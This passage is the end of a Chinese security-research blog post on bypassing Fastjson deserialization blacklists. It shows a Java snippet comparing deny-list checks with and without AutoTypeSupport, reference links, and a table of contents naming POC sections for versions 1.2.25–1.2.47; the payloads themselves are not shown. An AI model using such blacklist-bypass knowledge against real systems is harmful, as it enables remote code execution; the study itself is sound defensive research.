+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="fastjson——1-2-68"><a href="#fastjson——1-2-68" class="headerlink" title="fastjson——1.2.68"></a>fastjson——1.2.68</h2><h1 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h1><p><a class="link"   target="_blank" rel="noopener" href="https://goodapple.top/archives/832" >https://goodapple.top/archives/832 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson-%E7%AF%87-01-Fastjson-%E5%9F%BA%E7%A1%80" >https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson-%E7%AF%87-01-Fastjson-%E5%9F%BA%E7%A1%80 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/" >https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> Fastjson反序列化(三)</li>
+        <li><strong>作者:</strong> Chiexf</li>
+        <li><strong>创建于:</strong> 2023-10-07 00:00:00</li>
+        
+            <li>
+                <strong>更新于:</strong> 2023-10-19 21:05:31
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2023/10/07/Java安全/Fastjson反序列化(三)/
+        </li>
+        <li>
+            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/Fastjson/">#Fastjson</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/10/04/Java%E5%AE%89%E5%85%A8/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%E4%BA%8C)/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Fastjson反序列化(二)</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">Fastjson反序列化(三)</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E4%BB%8B%E7%BB%8D"><span class="nav-text">0x00 介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="nav-text">0x01 历史版本绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-25"><span class="nav-text">fastjson-1.2.25</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-42"><span class="nav-text">fastjson-1.2.42</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-1"><span class="nav-text">POC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-43"><span class="nav-text">fastjson-1.2.43</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-2"><span class="nav-text">POC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-44"><span class="nav-text">fastjson-1.2.44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-45"><span class="nav-text">fastjson-1.2.45</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-3"><span class="nav-text">POC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-47"><span class="nav-text">fastjson-1.2.47</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-4"><span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-text">影响范围</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson%E2%80%94%E2%80%941-2-68"><span class="nav-text">fastjson——1.2.68</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">0x03 参考资料</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Chiexf</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br>
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.3.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+        ],
+        containers: ["#swup"],
+    });
+
+    swup.on("pageView", () => {
+        Global.refresh();
+    });
+
+    // if (document.readyState === "complete") {
+    //
+    // } else {
+    //     document.addEventListener("DOMContentLoaded", () => init());
+    // }
+</script>
+
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+<script src="/js/layouts/categoryList.js"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+</body>
+</html>
